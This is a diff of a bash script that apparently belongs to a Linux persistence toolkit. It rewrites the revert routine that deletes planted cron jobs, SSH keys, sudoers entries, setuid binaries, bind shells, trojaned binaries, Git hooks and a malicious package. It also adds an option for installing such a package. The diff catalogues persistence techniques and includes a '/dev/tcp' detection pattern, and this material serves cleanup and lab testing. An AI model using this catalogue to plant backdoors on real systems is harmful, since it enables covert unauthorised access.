+	else
+		systemctl --user stop generator.service 2>/dev/null
+		systemctl --user disable generator.service 2>/dev/null
+	fi
+	echo "[+] Successfully cleaned persistence method Systemd Generator"
 
-    # XDG
-    echo "[*] Cleaning XDG persistence methods..."
-    rm -f /etc/xdg/autostart/pkc12-register.desktop
-    rm -f /etc/xdg/pkc12-register
-    rm -f /home/$current_user/.config/autostart/user-dirs.desktop
-    rm -f /home/$current_user/.config/autostart/.user-dirs
-    echo "[+] Successfully cleaned persistence method XDG"
+	# Cron
+	echo "[*] Cleaning Cron persistence methods..."
+	if $is_root; then
+		rm -f /etc/cron.d/freedesktop_timesync1
+		for file in /etc/cron*; do
+			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
+		done
+	fi
+	crontab -l | grep -v "$malicious_entry" | crontab -
+	echo "[+] Successfully cleaned persistence method Cron"
 
-    # SSH
-    echo "[*] Cleaning SSH persistence methods..."
-    rm -f $ssh_dir/id_rsa1822
-    rm -f $ssh_dir/id_rsa1822.pub
-    echo "[+] Successfully cleaned persistence method SSH"
+	# At
+	echo "[*] Cleaning At persistence methods..."
+	if $is_root; then
+		for file in /var/spool/cron/atjobs/*; do
+			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
+		done
+	fi
+	echo "[+] Successfully cleaned persistence method At"
 
-    # Sudoers
-    echo "[*] Cleaning Sudoers persistence methods..."
-    rm -f /etc/sudoers.d/$current_user
-    echo "[+] Successfully cleaned persistence method Sudoers"
+	# Shell profile
+	echo "[*] Cleaning Shell profile persistence methods..."
+	if $is_root; then
+		[ -e "/etc/profile" ] && sed -i "/$malicious_entry/ d" /etc/profile 2>/dev/null
+	fi
+	[ -e "/home/$current_user/.bash_profile" ] && sed -i "/$malicious_entry/ d" /home/$current_user/.bash_profile 2>/dev/null
+	echo "[+] Successfully cleaned persistence method Shell profile"
 
-    # Setuid
-    echo "[*] Cleaning Setuid persistence methods..."
-    for bin in find dash python python3; do
-        [ -e "$(which $bin)" ] && chmod u-s $(which $bin) 2>/dev/null
-    done
-    echo "[+] Successfully cleaned persistence method Setuid"
+	# XDG
+	echo "[*] Cleaning XDG persistence methods..."
+	if $is_root; then
+		rm -f /etc/xdg/autostart/pkc12-register.desktop
+		rm -f /etc/xdg/pkc12-register
+	fi
+	rm -f /home/$current_user/.config/autostart/user-dirs.desktop
+	rm -f /home/$current_user/.config/autostart/.user-dirs
+	echo "[+] Successfully cleaned persistence method XDG"
 
-    # MOTD
-    echo "[*] Cleaning MOTD persistence methods..."
-    rm -f /etc/update-motd.d/137-python-upgrades
-    for file in /etc/update-motd.d/*; do
-        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" $file 2>/dev/null
-    done
-    echo "[+] Successfully cleaned persistence method MOTD"
+	# SSH
+	echo "[*] Cleaning SSH persistence methods..."
+	rm -f $ssh_dir/id_rsa1822
+	rm -f $ssh_dir/id_rsa1822.pub
+	echo "[+] Successfully cleaned persistence method SSH"
 
-    # rc.local
-    echo "[*] Cleaning rc.local persistence methods..."
-    for file in /etc/update-motd.d/*; do
-        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" /etc/rc.local 2>/dev/null
-    echo "[+] Successfully cleaned persistence method rc.local"
+	# Sudoers
+	echo "[*] Cleaning Sudoers persistence methods..."
+	if $is_root; then
+		rm -f /etc/sudoers.d/$current_user
+	fi
+	echo "[+] Successfully cleaned persistence method Sudoers"
 
-    # initd
-    echo "[*] Cleaning initd persistence methods..."
-    rm -f /etc/init.d/ssh-procps
-    echo "[+] Successfully cleaned persistence method initd"
+	# Setuid
+	echo "[*] Cleaning Setuid persistence methods..."
+	if $is_root; then
+		for bin in find dash python python3; do
+			[ -e "$(which $bin)" ] && chmod u-s $(which $bin) 2>/dev/null
+		done
+	fi
+	echo "[+] Successfully cleaned persistence method Setuid"
 
-    # Package Managers
-    echo "[*] Cleaning Package Managers persistence methods..."
-    rm -f /etc/apt/apt.conf.d/01python-upgrades
-    rm -f /usr/lib/yumcon
-    rm -f /usr/lib/yum-plugins/yumcon.py
-    rm -f /etc/yum/pluginconf.d/yumcon.conf
-    local python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
-    [ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnfcon
-    rm -f /etc/dnf/plugins/dnfcon.conf
-    [ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
-    echo "[+] Successfully cleaned persistence method Package Managers"
+	# MOTD
+	echo "[*] Cleaning MOTD persistence methods..."
+	if $is_root; then
+		rm -f /etc/update-motd.d/137-python-upgrades
+		for file in /etc/update-motd.d/*; do
+			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
+		done
+	fi
+	echo "[+] Successfully cleaned persistence method MOTD"
 
-    # setcap
-    echo "[*] Cleaning setcap persistence methods..."
-    for bin in perl ruby php python python3 node; do
-        [ -e "$(which $bin)" ] && setcap -r $(which $bin) 2>/dev/null
-    done
-    echo "[+] Successfully cleaned persistence method setcap"
+	# rc.local
+	echo "[*] Cleaning rc.local persistence methods..."
+	if $is_root; then
+		[ -e "/etc/rc.local" ] && sed -i "/$malicious_entry/ d" /etc/rc.local 2>/dev/null
+	fi
+	echo "[+] Successfully cleaned persistence method rc.local"
 
-    # Bind shell
-    echo "[*] Cleaning Bind shell persistence methods..."
-    pkill -f /tmp/bd86 2>/dev/null
-    rm -f /tmp/bd86
+	# initd
+	echo "[*] Cleaning initd persistence methods..."
+	if $is_root; then
+		rm -f /etc/init.d/ssh-procps
+	fi
+	echo "[+] Successfully cleaned persistence method initd"
 
-    pkill -f /tmp/bd64 2>/dev/null
-    rm -f /tmp/bd64
-    echo "[+] Successfully cleaned persistence method Bind shell"
+	# Package Managers
+	echo "[*] Cleaning Package Managers persistence methods..."
+	if $is_root; then
+		rm -f /etc/apt/apt.conf.d/01python-upgrades
+		rm -f /usr/lib/yumcon
+		rm -f /usr/lib/yum-plugins/yumcon.py
+		rm -f /etc/yum/pluginconf.d/yumcon.conf
+		local python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
+		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnfcon
+		rm -f /etc/dnf/plugins/dnfcon.conf
+		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
+	fi
+	echo "[+] Successfully cleaned persistence method Package Managers"
 
-    # Backdoor binaries
-    echo "[*] Cleaning Backdoor binaries persistence methods..."
-    for binary in cat ls; do
-        original=$(which $binary).original
-        if [ -f "$original" ]; then
-            mv "$original" "$(which $binary)" 2>/dev/null
-            if [ $? -eq 0 ]; then
-                echo "[+] Successfully restored $binary binary"
-            else
-                echo "[-] Failed to restore $binary binary"
-            fi
-        else
-            echo "[*] No original file for $binary found, skipping..."
-        fi
-    done
-    echo "[+] Successfully cleaned persistence method Backdoor binaries"
+	# setcap
+	echo "[*] Cleaning setcap persistence methods..."
+	if $is_root; then
+		for bin in perl ruby php python python3 node; do
+			[ -e "$(which $bin)" ] && setcap -r $(which $bin) 2>/dev/null
+		done
+	fi
+	echo "[+] Successfully cleaned persistence method setcap"
 
-    # udev
-    echo "[*] Cleaning udev persistence methods..."
-    rm -f /usr/bin/atest
-    rm -f /etc/udev/rules.d/10-atest.rules
-    rm -f /usr/bin/crontest
-    rm -f /etc/udev/rules.d/11-crontest.rules
-    rm -f /etc/udev/rules.d/12-systemdtest.rules
-    systemctl stop systemdtest.service 2>/dev/null
-    systemctl disable systemdtest.service 2>/dev/null
-    rm -f /etc/systemd/system/systemdtest.service
-    echo "[+] Successfully cleaned persistence method udev"
+	# Bind shell
+	echo "[*] Cleaning Bind shell persistence methods..."
+	if $is_root; then
+		pkill -f /tmp/bd86 2>/dev/null
+		pkill -f /tmp/bd64 2>/dev/null
+	fi
+	rm -f /tmp/bd86
+	rm -f /tmp/bd64
+	echo "[+] Successfully cleaned persistence method Bind shell"
 
-    # Docker
-    echo "[*] Cleaning Docker persistence methods..."
-    rm -f /tmp/Dockerfile
-    docker stop malicious-container 2>/dev/null
-    docker rm malicious-container 2>/dev/null
-    echo "[+] Successfully cleaned persistence method Docker"
+	# Backdoor binaries
+	echo "[*] Cleaning Backdoor binaries persistence methods..."
+	if $is_root; then
+		for binary in cat ls; do
+			original=$(which $binary).original
+			if [ -f "$original" ]; then
+				mv "$original" "$(which $binary)" 2>/dev/null
+				if [ $? -eq 0 ]; then
+					echo "[+] Successfully restored $binary binary"
+				else
+					echo "[-] Failed to restore $binary binary"
+				fi
+			else
+				echo "[*] No original file for $binary found, skipping..."
+			fi
+		done
+	fi
+	echo "[+] Successfully cleaned persistence method Backdoor binaries"
+
+	# udev
+	echo "[*] Cleaning udev persistence methods..."
+	if $is_root; then
+		rm -f /usr/bin/atest
+		rm -f /etc/udev/rules.d/10-atest.rules
+		rm -f /usr/bin/crontest
+		rm -f /etc/udev/rules.d/11-crontest.rules
+		rm -f /etc/udev/rules.d/12-systemdtest.rules
+		systemctl stop systemdtest.service 2>/dev/null
+		systemctl disable systemdtest.service 2>/dev/null
+		rm -f /etc/systemd/system/systemdtest.service
+	fi
+	echo "[+] Successfully cleaned persistence method udev"
+
+	# Git
+	echo "[*] Cleaning Git persistence methods..."
+	local repos=$(find / -name ".git" -type d 2>/dev/null)
+
+	if [[ -z $repos ]]; then
+		echo "[-] No Git repositories found."
+	else
+		for repo in $repos; do
+			local git_repo=$(dirname $repo)
+			local pre_commit_file="$git_repo/.git/hooks/pre-commit"
+			local git_config="$git_repo/.git/config"
+			local user_git_config="/home/$current_user/.gitconfig"
+
+			# Remove malicious pre-commit hook
+			if [[ -f $pre_commit_file ]]; then
+				if grep -q "$malicious_entry" $pre_commit_file; then
+					sed -i "/$malicious_entry/ d" $pre_commit_file
+					echo "[+] Removed malicious entry from pre-commit hook in $git_repo"
+				fi
+			fi
+
+			# Remove malicious pager configuration from repo config
+			if [[ -f $git_config ]]; then
+				if grep -q "$malicious_entry" $git_config; then
+					sed -i "/$malicious_entry/ d" $git_config
+					echo "[+] Removed malicious pager from Git config in $git_repo"
+				fi
+			fi
+
+			# Remove malicious pager configuration from global config
+			if [[ -f $user_git_config ]]; then
+				if grep -q "$malicious_entry" $user_git_config; then
+					sed -i "/$malicious_entry/ d" $user_git_config
+					echo "[+] Removed malicious pager from global Git config"
+				fi
+			fi
+		done
+	fi
+	echo "[+] Successfully cleaned persistence method Git"
+
+	# Docker
+	echo "[*] Cleaning Docker persistence methods..."
+	if $is_root || $in_docker_group; then
+		rm -f /tmp/Dockerfile
+		docker stop malicious-container 2>/dev/null
+		docker rm malicious-container 2>/dev/null
+	fi
+	echo "[+] Successfully cleaned persistence method Docker"
+
+	# Malicious package
+	echo "[*] Cleaning Malicious package persistence methods..."
+	if $is_root; then
+		rm -f /var/lib/rpm/alpha.rpm
+		rm -f /var/lib/dpkg/info/alpha.postinst
+		sed -i '/alpha.rpm/ d' /var/spool/cron/$current_user
+		sed -i '/alpha.postinst/ d' /var/spool/cron/crontabs/$current_user
+	fi
+	echo "[+] Successfully cleaned persistence method Malicious package"
 }
 
 main() {
@@ -3009,11 +3285,16 @@ main() {
 				setup_git_persistence "$@"
 				exit
 				;;
-            --docker-container )
-                shift
-                setup_malicious_docker_container "$@"
-                exit
-                ;;
+			--docker-container )
+				shift
+				setup_malicious_docker_container "$@"
+				exit
+				;;
+			--malicious-package )
+				shift
+				setup_malicious_package "$@"
+				exit
+				;;
 			--revert )
 				shift
 				revert_changes
